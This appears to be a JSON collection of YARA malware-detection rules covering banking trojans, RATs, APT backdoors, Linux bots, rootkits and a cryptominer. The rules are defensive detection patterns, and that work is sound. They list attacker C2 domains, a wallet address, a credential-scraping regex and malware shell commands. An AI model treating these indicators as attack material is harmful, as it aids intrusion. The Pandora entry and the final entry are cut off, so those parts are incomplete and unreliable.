  "spyeye_plugins": "rule spyeye_plugins : banker\n{\n\tmeta:\n\t\tauthor = \"Jean-Philippe Teissier / @Jipe_\"\n\t\tdescription = \"SpyEye X.Y Plugins memory\"\n\t\tdate = \"2012-05-23\" \n\t\tversion = \"1.0\" \n\t\tfiletype = \"memory\"\n\n\tstrings:\n\t\t$a = \"webfakes.dll\"\n\t\t$b = \"config.dat\"\t\t\t//may raise some FP\n\t\t$c = \"collectors.txt\"\n\t\t$d = \"webinjects.txt\"\n\t\t$e = \"screenshots.txt\"\n\t\t$f = \"billinghammer.dll\"\n\t\t$g = \"block.dll\"\t\t\t//may raise some FP\n\t\t$h = \"bugreport.dll\"\t\t//may raise some FP\n\t\t$i = \"ccgrabber.dll\"\n\t\t$j = \"connector2.dll\"\n\t\t$k = \"creditgrab.dll\"\n\t\t$l = \"customconnector.dll\"\n\t\t$m = \"ffcertgrabber.dll\"\n\t\t$n = \"ftpbc.dll\"\n\t\t$o = \"rdp.dll\"\t\t\t\t//may raise some FP\n\t\t$p = \"rt_2_4.dll\"\n\t\t$q = \"socks5.dll\"\t\t\t//may raise some FP\n\t\t$r = \"spySpread.dll\"\n\t\t$s = \"w2chek4_4.dll\"\n\t\t$t = \"w2chek4_6.dll\"\n\t\n\tcondition:\n\t\tany of them\n}",
  "callTogether_certificate": "rule callTogether_certificate\n{\n    meta:\n        Author      = \"Fireeye Labs\"\n        Date        = \"2014/11/03\" \n        Description = \"detects binaries signed with the CallTogether certificate\"\n        Reference   = \"https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html\"\n\n    strings:\n        $serial = { 45 21 56 C3 B3 FB 01 76 36 5B DB 5B 77 15 BC 4C }\n        $o = \"CallTogether, Inc.\"\n\n    condition:\n        $serial and $o\n}",
  "qti_certificate": "rule qti_certificate\n{\n    meta:\n        Author      = \"Fireeye Labs\"\n        Date        = \"2014/11/03\" \n        Description = \"detects binaries signed with the QTI International Inc certificate\"\n        Reference   = \"https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html\"\n\n    strings:\n        $cn = \"QTI International Inc\"\n        $serial = { 2e df b9 fd cf a0 0c cb 5a b0 09 ee 3a db 97 b9 }\n\n    condition:\n        $cn and $serial\n}",
  "DownExecute_A": "rule DownExecute_A\n{\n\tmeta:\n        Author      = \"PwC Cyber Threat Operations :: @tlansec\"\n        Date        = \"2015/04/27\"\n        Description = \"Malware is often wrapped/protected, best to run on memory\"\n        Reference   = \"http://pwc.blogs.com/cyber_security_updates/2015/04/attacks-against-israeli-palestinian-interests.html\"\n\n    strings:\n        $winver1 = \"win 8.1\"\n        $winver2 = \"win Server 2012 R2\"\n        $winver3 = \"win Srv 2012\"\n        $winver4 = \"win srv 2008 R2\"\n        $winver5 = \"win srv 2008\"\n        $winver6 = \"win vsta\"\n        $winver7 = \"win srv 2003 R2\"\n        $winver8 = \"win hm srv\"\n        $winver9 = \"win Strg srv 2003\"\n        $winver10 = \"win srv 2003\"\n        $winver11 = \"win XP prof x64 edt\"\n        $winver12 = \"win XP\"\n        $winver13 = \"win 2000\"\n\n        $pdb1 = \"D:\\\\Acms\\\\2\\\\docs\\\\Visual Studio 2013\\\\Projects\\\\DownloadExcute\\\\DownloadExcute\\\\Release\\\\DownExecute.pdb\"\n        $pdb2 = \"d:\\\\acms\\\\2\\\\docs\\\\visual studio 2013\\\\projects\\\\downloadexcute\\\\downloadexcute\\\\downexecute\\\\json\\\\rapidjson\\\\writer.h\"\n        $pdb3 = \":\\\\acms\\\\2\\\\docs\\\\visual studio 2013\\\\projects\\\\downloadexcute\\\\downloadexcute\\\\downexecute\\\\json\\\\rapidjson\\\\internal/stack.h\"\n        $pdb4 = \"\\\\downloadexcute\\\\downexecute\\\\\"\n\n        $magic1 = \"<Win Get Version Info Name Error\"\n        $magic2 = \"P@$sw0rd$nd\"\n        $magic3 = \"$t@k0v2rF10w\"\n        $magic4 = \"|*|123xXx(Mutex)xXx321|*|6-21-2014-03:06PM\" wide\n\n\t\t$str1 = \"Download Excute\" ascii wide fullword\n        $str2 = \"EncryptorFunctionPointer %d\"\n        $str3 = \"%s\\\\%s.lnk\"\n        $str4 = \"Mac:%s-Cpu:%s-HD:%s\"\n        $str5 = \"feed back responce of host\"\n        $str6 = \"GET Token at host\"\n        $str7 = \"dwn md5 err\"\n\n    condition:\n        all of ($winver*) or any of ($pdb*) or any of ($magic*) or 2 of ($str*)\n}",
  "CVE_2015_1674_CNGSYS": "rule CVE_2015_1674_CNGSYS {\n\tmeta:\n\t\tdescription = \"Detects exploits for CVE-2015-1674\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://www.binvul.com/viewthread.php?tid=508\"\n\t\treference2 = \"https://github.com/Neo23x0/Loki/blob/master/signatures/exploit_cve_2015_1674.yar\"\n\t\tdate = \"2015-05-14\"\n\t\thash = \"af4eb2a275f6bbc2bfeef656642ede9ce04fad36\"\n\tstrings:\n\t\t$s1 = \"\\\\Device\\\\CNG\" fullword wide\n\t\t\n\t\t$s2 = \"GetProcAddress\" fullword ascii\n\t\t$s3 = \"LoadLibrary\" ascii\n\t\t$s4 = \"KERNEL32.dll\" fullword ascii\n\t\t$s5 = \"ntdll.dll\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 60KB and all of them\n}",
  "Pandora": "rule Pandora\n{\n\tmeta:\n\t\tauthor = \" Kevin Breen <kevin@techanarchy.net>\"\n\t\tdate = \"2014/04\"\n\t\tref = \"http://malwareconfig.com/stats/Pandora\"\n\t\tmaltype = \"Remote Access Trojan\"\n\t\tfiletype = \"exe\"\n\n\tstrings:\n\t\t$a = \"Can't get the Windows version\"\n\t\t$b = \"=M=Q=U=Y=]=a=e=i=m=q=u=y=}",
  "Base64_encoded_Executable": "rule Base64_encoded_Executable {\n\tmeta:\n\t\tdescription = \"Detects an base64 encoded executable (often embedded)\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015-05-28\"\n\t\tscore = 50\n\tstrings:\n\t\t$s1 = \"TVpTAQEAAAAEAAAA//8AALgAAAA\" // 14 samples in goodware archive\n\t\t$s2 = \"TVoAAAAAAAAAAAAAAAAAAAAAAAA\" // 26 samples in goodware archive\n\t\t$s3 = \"TVqAAAEAAAAEABAAAAAAAAAAAAA\" // 75 samples in goodware archive\n\t\t$s4 = \"TVpQAAIAAAAEAA8A//8AALgAAAA\" // 168 samples in goodware archive\n\t\t$s5 = \"TVqQAAMAAAAEAAAA//8AALgAAAA\" // 28,529 samples in goodware archive\n\tcondition:\n\t\t1 of them\n}",
  "Typical_Malware_String_Transforms": "rule Typical_Malware_String_Transforms {\n\tmeta:\n\t\tdescription = \"Detects typical strings in a reversed or otherwise modified form\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"Internal Research\"\n\t\tdate = \"2016-07-31\"\n\t\tscore = 60\n\tstrings:\n\t\t/* Executables */\n\t\t$e1 = \"exe.tsohcvs\" fullword ascii\n\t\t$e2 = \"exe.ssasl\" fullword ascii\n\t\t$e3 = \"exe.rerolpxe\" fullword ascii\n\t\t$e4 = \"exe.erolpxei\" fullword ascii\n\t\t$e5 = \"exe.23lldnur\" fullword ascii\n\t\t$e6 = \"exe.dmc\" fullword ascii\n\t\t$e7 = \"exe.llikksat\" fullword ascii\n\n\t\t/* Libraries */\n\t\t$l1 = \"lld.23lenreK\" fullword ascii\n\t\t$l2 = \"lld.ESABLENREK\" fullword ascii\n\t\t$l3 = \"lld.esabtpyrc\" fullword ascii\n\t\t$l4 = \"lld.trcvsm\" fullword ascii\n\t\t$l5 = \"LLD.LLDTN\" fullword ascii\n\n\t\t/* Imports */\n\t\t$i1 = \"paeHssecorPteG\" fullword ascii\n\t\t$i2 = \"sserddAcorPteG\" fullword ascii\n\t\t$i3 = \"AyrarbiLdaoL\" fullword ascii\n\n\t\t/* Registry */\n\t\t$r1 = \"teSlortnoCtnerruC\" fullword ascii\n\t\t$r2 = \"nuR\\\\noisreVtnerruC\" fullword ascii\n\n\t\t/* Folders */\n\t\t$f1 = \"\\\\23metsys\\\\\" ascii\n\t\t$f2 = \"\\\\23metsyS\\\\\" ascii\n\t\t$f3 = \"niB.elcyceR$\" fullword ascii\n\t\t$f4 = \"%tooRmetsyS%\" fullword ascii\n\n\t\t/* False Positives */\n\t\t$fp1 = \"Application Impact Telemetry Static Analyzer\" fullword wide\n\tcondition:\n\t\t( uint16(0) == 0x5a4d and 1 of them and not 1 of ($fp*) )\n}",
  "Invoke_mimikittenz": "rule Invoke_mimikittenz {\n\tmeta:\n\t\tdescription = \"Detects Mimikittenz - file Invoke-mimikittenz.ps1\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://github.com/putterpanda/mimikittenz\"\n\t\tdate = \"2016-07-19\"\n\t\tscore = 90\n\t\thash1 = \"14e2f70470396a18c27debb419a4f4063c2ad5b6976f429d47f55e31066a5e6a\"\n\tstrings:\n\t\t$x1 = \"[mimikittenz.MemProcInspector]\" ascii\n\n\t\t$s1 = \"PROCESS_ALL_ACCESS = PROCESS_TERMINATE | PROCESS_CREATE_THREAD | PROCESS_SET_SESSIONID | PROCESS_VM_OPERATION |\" fullword ascii\n\t\t$s2 = \"IntPtr processHandle = MInterop.OpenProcess(MInterop.PROCESS_WM_READ | MInterop.PROCESS_QUERY_INFORMATION, false, process.Id);\" fullword ascii\n\t\t$s3 = \"&email=.{1,48}&create=.{1,2}&password=.{1,22}&metadata1=\" ascii\n\t\t$s4 = \"[DllImport(\\\"kernel32.dll\\\", SetLastError = true)]\" fullword ascii\n\tcondition:\n\t\t( uint16(0) == 0x7566 and filesize < 60KB and 2 of them ) or $x1\n}",
  "LinuxAESDDoS": "rule LinuxAESDDoS\n{\n    meta:\n\tAuthor = \"@benkow_\"\n\tDate = \"2014/09/12\"\n\tDescription = \"Strings inside\"\n        Reference = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3483\"\n\n    strings:\n        $a = \"3AES\"\n        $b = \"Hacker\"\n        $c = \"VERSONEX\"\n\n    condition:\n        2 of them\n}",
  "LinuxBillGates": "rule LinuxBillGates \n{\n    meta:\n       Author      = \"@benkow_\"\n       Date        = \"2014/08/11\" \n       Description = \"Strings inside\"\n       Reference   = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3429\" \n\n    strings:\n        $a= \"12CUpdateGates\"\n        $b= \"11CUpdateBill\"\n\n    condition:\n        $a and $b\n}",
  "LinuxElknot": "rule LinuxElknot\n{\n    meta:\n\tAuthor      = \"@benkow_\"\n        Date        = \"2013/12/24\" \n        Description = \"Strings inside\"\n        Reference   = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3099\"\n\n    strings:\n        $a = \"ZN8CUtility7DeCryptEPciPKci\"\n\t$b = \"ZN13CThreadAttack5StartEP11CCmdMessage\"\n\n    condition:\n\tall of them\n}",
  "LinuxMrBlack": "rule LinuxMrBlack\n{\n    meta:\n\tAuthor      = \"@benkow_\"\n        Date        = \"2014/09/12\" \n        Description = \"Strings inside\"\n        Reference   = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3483\"\n\n    strings:\n        $a = \"Mr.Black\"\n\t$b = \"VERS0NEX:%s|%d|%d|%s\"\n    condition:\n        $a and $b\n}",
  "LinuxTsunami": "rule LinuxTsunami\n{\n    meta:\n\t\n\t\tAuthor      = \"@benkow_\"\n\t\tDate        = \"2014/09/12\" \n\t\tDescription = \"Strings inside\"\n\t\tReference   = \"http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3483\"\n\n    strings:\n        $a = \"PRIVMSG %s :[STD]Hitting %s\"\n        $b = \"NOTICE %s :TSUNAMI <target> <secs>\"\n        $c = \"NOTICE %s :I'm having a problem resolving my host, someone will have to SPOOFS me manually.\"\n    condition:\n        $a or $b or $c\n}",
  "rootkit": "rule rootkit\n{\n\tmeta:\n                author=\"xorseed\"\n                reference= \"https://stuff.rop.io/\"\n\tstrings:\n\t\t$sys1 = \"sys_write\" nocase ascii wide\t\n\t\t$sys2 = \"sys_getdents\" nocase ascii wide\n\t\t$sys3 = \"sys_getdents64\" nocase ascii wide\n\t\t$sys4 = \"sys_getpgid\" nocase ascii wide\n\t\t$sys5 = \"sys_getsid\" nocase ascii wide\n\t\t$sys6 = \"sys_setpgid\" nocase ascii wide\n\t\t$sys7 = \"sys_kill\" nocase ascii wide\n\t\t$sys8 = \"sys_tgkill\" nocase ascii wide\n\t\t$sys9 = \"sys_tkill\" nocase ascii wide\n\t\t$sys10 = \"sys_sched_setscheduler\" nocase ascii wide\n\t\t$sys11 = \"sys_sched_setparam\" nocase ascii wide\n\t\t$sys12 = \"sys_sched_getscheduler\" nocase ascii wide\n\t\t$sys13 = \"sys_sched_getparam\" nocase ascii wide\n\t\t$sys14 = \"sys_sched_setaffinity\" nocase ascii wide\n\t\t$sys15 = \"sys_sched_getaffinity\" nocase ascii wide\n\t\t$sys16 = \"sys_sched_rr_get_interval\" nocase ascii wide\n\t\t$sys17 = \"sys_wait4\" nocase ascii wide\n\t\t$sys18 = \"sys_waitid\" nocase ascii wide\n\t\t$sys19 = \"sys_rt_tgsigqueueinfo\" nocase ascii wide\n\t\t$sys20 = \"sys_rt_sigqueueinfo\" nocase ascii wide\n\t\t$sys21 = \"sys_prlimit64\" nocase ascii wide\n\t\t$sys22 = \"sys_ptrace\" nocase ascii wide\n\t\t$sys23 = \"sys_migrate_pages\" nocase ascii wide\n\t\t$sys24 = \"sys_move_pages\" nocase ascii wide\n\t\t$sys25 = \"sys_get_robust_list\" nocase ascii wide\n\t\t$sys26 = \"sys_perf_event_open\" nocase ascii wide\n\t\t$sys27 = \"sys_uname\" nocase ascii wide\n\t\t$sys28 = \"sys_unlink\" nocase ascii wide\n\t\t$sys29 = \"sys_unlikat\" nocase ascii wide\n\t\t$sys30 = \"sys_rename\" nocase ascii wide\n\t\t$sys31 = \"sys_read\" nocase ascii wide\n\t\t$sys32 = \"kobject_del\" nocase ascii wide\n\t\t$sys33 = \"list_del_init\" nocase ascii wide\n\t\t$sys34 = \"inet_ioctl\" nocase ascii wide\n\tcondition:\n\t\t9 of them\n}",
  "exploit": "rule exploit\n{\n        meta:\n                author=\"xorseed\"\n                reference= \"https://stuff.rop.io/\"\n\tstrings:\n\t\t$xpl1 = \"set_fs_root\" nocase ascii wide\n\t\t$xpl2 = \"set_fs_pwd\" nocase ascii wide\n\t\t$xpl3 = \"__virt_addr_valid\" nocase ascii wide\n\t\t$xpl4 = \"init_task\" nocase ascii wide\n\t\t$xpl5 = \"init_fs\" nocase ascii wide\n\t\t$xpl6 = \"bad_file_ops\" nocase ascii wide\n\t\t$xpl7 = \"bad_file_aio_read\" nocase ascii wide\n\t\t$xpl8 = \"security_ops\" nocase ascii wide\n\t\t$xpl9 = \"default_security_ops\" nocase ascii wide\n\t\t$xpl10 = \"audit_enabled\" nocase ascii wide\n\t\t$xpl11 = \"commit_creds\" nocase ascii wide\n\t\t$xpl12 = \"prepare_kernel_cred\" nocase ascii wide\n\t\t$xpl13 = \"ptmx_fops\" nocase ascii wide\n\t\t$xpl14 = \"node_states\" nocase ascii wide\n\tcondition:\n\t\t7 of them\n}",
  "nkminer_monero": "rule nkminer_monero {\n\n meta:\n\n description = \"Detects installer of Monero miner that points to a NK domain\"\n\n author = \"cdoman@alienvault.com\"\n \n reference = \"https://www.alienvault.com/blogs/labs-research/a-north-korean-monero-cryptocurrency-miner\"\n\n tlp = \"white\"\n\n license = \"MIT License\"\n\n strings:\n\n $a = \"82e999fb-a6e0-4094-aa1f-1a306069d1a5\" nocase wide ascii\n\n $b = \"4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRy5YeFCqgoUMnzumvS\" nocase wide ascii\n\n $c = \"barjuok.ryongnamsan.edu.kp\" nocase wide ascii\n\n $d = \"C:\\\\SoftwaresInstall\\\\soft\" nocase wide ascii\n\n $e = \"C:\\\\Windows\\\\Sys64\\\\intelservice.exe\" nocase wide ascii\n\n $f = \"C:\\\\Windows\\\\Sys64\\\\updater.exe\" nocase wide ascii\n\n $g = \"C:\\\\Users\\\\Jawhar\\\\documents\\\\\" nocase wide ascii\n\n condition:\n\n any of them\n\n}",
  "NSFree": "rule NSFree : Family\n{\n    meta:\n        description = \"NSFree\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-24\"\n        \n    condition:\n        NSFreeCode or NSFreeStrings\n}",
  "Naikon": "rule Naikon : Family\n{\n    meta:\n        description = \"Naikon\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-25\"\n        \n    condition:\n        NaikonCode or NaikonStrings\n}",
  "Backdoor_Naikon_APT_Sample1": "rule Backdoor_Naikon_APT_Sample1 {\n\tmeta:\n\t\tdescription = \"Detects backdoors related to the Naikon APT\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://goo.gl/7vHyvh\"\n\t\tdate = \"2015-05-14\"\n\t\thash = \"d5716c80cba8554eb79eecfb4aa3d99faf0435a1833ec5ef51f528146c758eba\"\n\t\thash = \"f5ab8e49c0778fa208baad660fe4fa40fc8a114f5f71614afbd6dcc09625cb96\"\n\tstrings:\n\t\t$x0 = \"GET http://%s:%d/aspxabcdef.asp?%s HTTP/1.1\" fullword ascii\n\t\t$x1 = \"POST http://%s:%d/aspxabcdefg.asp?%s HTTP/1.1\" fullword ascii\n\t\t$x2 = \"greensky27.vicp.net\" fullword ascii\n\t\t$x3 = \"\\\\tempvxd.vxd.dll\" fullword wide\n\t\t$x4 = \"otna.vicp.net\" fullword ascii\n\t\t$x5 = \"smithking19.gicp.net\" fullword ascii\n\t\t\n\t\t$s1 = \"User-Agent: webclient\" fullword ascii\n\t\t$s2 = \"\\\\User.ini\" fullword ascii\n\t\t$s3 = \"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-EN; rv:1.7.12) Gecko/200\" ascii\n\t\t$s4 = \"\\\\UserProfile.dll\" fullword wide\n\t\t$s5 = \"Connection:Keep-Alive: %d\" fullword ascii\n\t\t$s6 = \"Referer: http://%s:%d/\" fullword ascii\n\t\t$s7 = \"%s %s %s %d %d %d \" fullword ascii\n\t\t$s8 = \"%s--%s\" fullword wide\n\t\t$s9 = \"Run File Success!\" fullword wide\n\t\t$s10 = \"DRIVE_REMOTE\" fullword wide\n\t\t$s11 = \"ProxyEnable\" fullword wide\n\t\t$s12 = \"\\\\cmd.exe\" fullword wide\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 1000KB and\n\t\t(\n\t\t\t1 of ($x*) or 7 of ($s*)\n\t\t)\n}",
  "nAspyUpdate": "rule nAspyUpdate : Family\n{\n    meta:\n        description = \"nAspyUpdate\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-07-14\"\n        \n    condition:\n        nAspyUpdateCode or nAspyUpdateStrings\n}",
  "NetPass": "rule NetPass : Variant {\n        meta:\n                description = \"netpass variant\"\n                author = \"Katie Kleemola\"\n                last_updated = \"2014-07-08\"\n        condition:\n                NetpassStrings\n}",
  "NetTraveler": "rule NetTraveler : Family {\n\tmeta:\n\t\tdescription = \"Nettravelr\"\n\t\tauthor = \"Katie Kleemola\"\n\t\tlast_updated = \"2014-07-08\"\n\t\n\tcondition:\n\t\tNetTravExports or NetTravStrings or NetpassStrings\n\n}",
  "NionSpy": "rule NionSpy : win32\n{\nmeta:\ndescription = \"Triggers on old and new variants of W32/NionSpy file infector\"\nreference = \"https://blogs.mcafee.com/mcafee-labs/taking-a-close-look-at-data-stealing-nionspy-file-infector\"\nstrings:\n$variant2015_infmarker = \"aCfG92KXpcSo4Y94BnUrFmnNk27EhW6CqP5EnT\"\n$variant2013_infmarker = \"ad6af8bd5835d19cc7fdc4c62fdf02a1\"\n$variant2013_string = \"%s?cstorage=shell&comp=%s\"\ncondition:\nuint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and 1 of ($variant*)\n}",
  "TROJAN_Notepad": "rule TROJAN_Notepad {\n    meta:\n        Author = \"RSA_IR\"\n        Date     = \"4Jun13\"\n        File     = \"notepad.exe v 1.1\"\n        MD5      = \"106E63DBDA3A76BEEB53A8BBD8F98927\"\n    strings:\n        $s1 = \"75BAA77C842BE168B0F66C42C7885997\"\n        $s2 = \"B523F63566F407F3834BCC54AAA32524\"\n    condition:\n        $s1 or $s2\n}",
  "leverage_a": "rule leverage_a\n{\n\tmeta:\n\t\tauthor = \"earada@alienvault.com\"\n\t\tversion = \"1.0\"\n\t\tdescription = \"OSX/Leverage.A\"\n\t\tdate = \"2013/09\"\n\tstrings:\n\t\t$a1 = \"ioreg -l | grep \\\"IOPlatformSerialNumber\\\" | awk -F\"\n\t\t$a2 = \"+:Users:Shared:UserEvent.app:Contents:MacOS:\"\n\t\t$a3 = \"rm '/Users/Shared/UserEvent.app/Contents/Resources/UserEvent.icns'\"\n\t\t$script1 = \"osascript -e 'tell application \\\"System Events\\\" to get the hidden of every login item'\"\n\t\t$script2 = \"osascript -e 'tell application \\\"System Events\\\" to get the name of every login item'\"\n\t\t$script3 = \"osascript -e 'tell application \\\"System Events\\\" to get the path of every login item'\"\n\t\t$properties = \"serverVisible \\x00\"\n\tcondition:\n\t\tall of them\n}",
  "Olyx": "rule Olyx : Family\n{\n    meta:\n        description = \"Olyx\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-19\"\n        \n    condition:\n        OlyxCode or OlyxStrings\n}",
  "PittyTiger": "rule PittyTiger {\n  meta: \n    author = \" (@chort0)\"\n    description = \"Detect PittyTiger Trojan via common strings\"\n    strings: \n      $ptUserAgent = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.; SV1)\" // missing minor digit\n      $ptFC001 = \"FC001\" fullword \n      $ptPittyTiger = \"PittyTiger\" fullword \n      $trjHTMLerr = \"trj:HTML Err.\" nocase fullword \n      $trjworkFunc = \"trj:workFunc start.\" nocase fullword \n      $trjcmdtout = \"trj:cmd time out.\" nocase fullword \n      $trjThrtout = \"trj:Thread time out.\" nocase fullword\n      $trjCrPTdone = \"trj:Create PT done.\" nocase fullword\n      $trjCrPTerr = \"trj:Create PT error: mutex already exists.\" nocase fullword \n      $oddPippeFailed = \"Create Pippe Failed!\" fullword // extra 'p'\n      $oddXferingFile = \"Transfering File\" fullword // missing 'r' \n      $oddParasError = \"put Paras Error:\" fullword // abbreviated 'parameters'? \n      $oddCmdTOutkilled = \"Cmd Time Out..Cmd has been killed.\" fullword \ncondition: \n  (any of ($pt*)) and (any of ($trj*)) and (any of ($odd*)) \n  }",
  "PolishBankRAT_srservice_xorloop": "rule PolishBankRAT_srservice_xorloop \n{\n\tmeta:\n\t\n\t\tauthor = \"Booz Allen Hamilton Dark Labs\"\n\t\tdescription = \"Finds the custom xor decode loop for <PolishBankRAT_srservice>\"\n\t\n\tstrings:\n\n\t\t$loop = { 48 8B CD E8 60 FF FF FF 48 FF C3 32 44 1E FF 48 FF CF 88 43 FF }\n\n\tcondition:\n\n\t\t(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and $loop\n}",
  "PolishBankRAT_fdsvc_xor_loop": "rule PolishBankRAT_fdsvc_xor_loop \n{\n\tmeta:\n\n\t\tauthor = \"Booz Allen Hamilton Dark Labs\"\n\t\tdescription = \"Finds the custom xor decode loop for <PolishBankRAT_fdsvc>\"\n\n\tstrings:\n\n\t\t$loop = {0F B6 42 FF 48 8D 52 FF 30 42 01 FF CF 75 F1}\n\n\tcondition:\n\n\t\t(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and $loop\n}",
  "PolishBankRAT_fdsvc_decode2": "rule PolishBankRAT_fdsvc_decode2 \n{\n\tmeta:\n\t\t\n\t\tauthor = \"Booz Allen Hamilton Dark Labs\"\n\t\tdescription = \"Find a constant used as part of a payload decoding function in PolishBankRAT_fdsvc\"\n\n\tstrings:\n\t\t\n\t\t$part1 = {A6 EB 96}\n\t\t$part2 = {61 B2 E2 EF}\n\t\t$part3 = {0D CB E8 C4}\n\t\t$part4 = {5A F1 66 9C}\n\t\t$part5 = {A4 80 CD 9A}\n\t\t$part6 = {F1 2F 46 25}\n\t\t$part7 = {2F DB 16 26}\n\t\t$part8 = {4B C4 3F 3C}\n\t\t$str1 = \"This program cannot be run in DOS mode\"\n\n\tcondition:\n\n\t\t(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and all of them\n}",
  "decoded_PolishBankRAT_fdsvc_strings": "rule decoded_PolishBankRAT_fdsvc_strings \n{\n\tmeta:\n\n\t\tauthor = \"Booz Allen Hamilton Dark Labs\"\n\t\tdescription = \"Finds hard coded strings in PolishBankRAT_fdsvc\"\n\n\tstrings:\n\n\t\t$str1 = \"ssylka\" wide ascii\n\t\t$str2 = \"ustanavlivat\" wide ascii\n\t\t$str3 = \"poluchit\" wide ascii\n\t\t$str4 = \"pereslat\" wide ascii\n\t\t$str5 = \"derzhat\" wide ascii\n\t\t$str6 = \"vykhodit\" wide ascii\n\t\t$str7 = \"Nachalo\" wide ascii\n\n\tcondition:\n\t\t\n\t\t(uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and 4 of ($str*)\n}",
  "Trj_Ponmocup": "rule Trj_Ponmocup {\n        meta:\n                author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n                ref =\"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n                description = \"Ponmocup Installer\"\n        strings:\n                $mz = { 4d 5a }\n                $pac = { 48 8F BB 54 5F 3E 4F 4E }\n                $unp = { 8B B8 7C 1F 46 00 33 C8 }\n        condition:\n                ($mz at 0) and ($pac at 0x61F7C) and ($unp at 0x29F0)\n}",
  "Trj_Ponmocup_Downloader": "rule Trj_Ponmocup_Downloader {\n        meta:\n                author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n                ref =\"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n                description = \"Ponmocup Downloader\"\n        strings:\n                $mz = { 4d 5a }\n                $vb5 = \"VB5\" fullword ascii\n                $tpb = \"www.thepiratebay.org\" fullword wide\n                $ua = \"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.2; SV1)\" fullword wide\n        condition:\n                ($mz at 0) and ($vb5) and ($tpb) and ($ua)\n}",
  "Trj_Ponmocup_dll": "rule Trj_Ponmocup_dll {\n        meta:\n                author = \"Centro Criptol\u00f3gico Nacional (CCN)\"\n                ref =\"https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html\"\n                description = \"Ponmocup Bot DLL\"\n        strings:\n                $mz = { 4d 5a }\n                $pck = { 00 81 23 00 33 3E 00 00 3B F4 56 00 00 00 7D 00 }\n                $upk = { 68 F4 14 00 10 A1 6C C0 02 10 FF D0 59 59 E9 7A }\n        condition:\n                ($mz at 0) and ($pck at 0x8a50) and ($upk at 0x61f)\n}",
  "pony": "rule pony {\n    meta:\n        author = \"Brian Wallace @botnet_hunter\"\n        author_email = \"bwall@ballastsecurity.net\"\n        date = \"2014-08-16\"\n        description = \"Identify Pony\"\n\tstrings:\n    \t$s1 = \"{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}\"\n    \t$s2 = \"YUIPWDFILE0YUIPKDFILE0YUICRYPTED0YUI1.0\"\n    \t$s3 = \"POST %s HTTP/1.0\"\n    \t$s4 = \"Accept-Encoding: identity, *;q=0\"\n\n    \t//$useragent1 = \"Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)\"\n    \t//$useragent2 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0)\"\n    condition:\n        $s1 and $s2 and $s3 and $s4\n}",
  "Predator_The_Thief": "rule Predator_The_Thief : Predator_The_Thief {\n   meta:\n        description = \"Yara rule for Predator The Thief v2.3.5 & +\"\n        author = \"Fumik0_\"\n        date = \"2018/10/12\"\n        source = \"https://fumik0.com/2018/10/15/predator-the-thief-in-depth-analysis-v2-3-5/\"\n   strings:\n        $mz = { 4D 5A }\n\n        $hex1 = { BF 00 00 40 06 } \n        $hex2 = { C6 04 31 6B }\n        $hex3 = { C6 04 31 63 }\n        $hex4 = { C6 04 31 75 }\n        $hex5 = { C6 04 31 66 }\n\n        $s1 = \"sqlite_\" ascii wide\n   condition:\n        $mz at 0 and all of ($hex*) and all of ($s*)\n}",
  "PubSab": "rule PubSab : Family\n{\n    meta:\n        description = \"PubSab\"\n        author = \"Seth Hardy\"\n        last_modified = \"2014-06-19\"\n        \n    condition:\n        PubSabCode or PubSabStrings\n}",
  "MALW_PurpleWave_v1": "rule MALW_PurpleWave_v1\n{\n    meta:\n        Description =\"Generic rule to identify PurpleWave v1.0\"\n        Author = \"Xylitol <xylitol@temari.fr>\"\n        date = \"2020-08-01\"\n        reference = \"https://twitter.com/3xp0rtblog/status/1289125217751781376\"\n        hash1 = \"7de7b866c46f34be28f7085fb1a1727ab939d65abd3128871fb68c42371af2df\"\n        hash2 = \"76bffcf04104a1c4e6a5792d3795d1a03c7497a274042889b8f44c8f8facc304\"\n        hash3 = \"832d667b00c07424f050f84e717f8db22833b1e8e131aa7a33de739c4f4b4cdd\"\n        hash4 = \"917057a6a03252bc2525b326a63111fce050fc86e6e3b26fa9e452489f1358b9\"\n        hash5 = \"a8577e1ccad877ae5ff4bf89aa578989404643c6fdf10baafd4335a1766abb16\"\n        hash6 = \"d5ec98c98a8f56fdeb00cc2404c4527a39726bf43d8b9cf6c4c8c36364f94161\"\n        hash7 = 